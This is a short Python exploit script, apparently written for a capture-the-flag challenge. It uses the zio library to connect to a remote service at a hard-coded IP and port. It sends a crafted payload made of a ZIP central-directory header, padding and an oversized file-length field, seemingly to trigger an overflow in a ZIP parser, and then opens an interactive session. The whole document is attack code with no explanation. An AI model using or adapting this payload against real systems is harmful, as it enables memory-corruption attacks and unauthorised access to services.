from zio import *
#target = ('127.0.0.1',8888)
target = ('159.203.87.2',8888)
io = zio(target,print_read=COLORED(RAW,'red'),print_write=COLORED(RAW,'green'))

#0x30

io.read_until('#\n')
io.gdb_hint()
payload = 'PK\x01\x02'
payload = payload.ljust(28,'0')
file_length = '\xff\xff'
payload += file_length
payload = payload.ljust(len(payload)+0x10,'b')
payload = payload.ljust(0x200,'b')
io.writeline(payload)
io.interact()
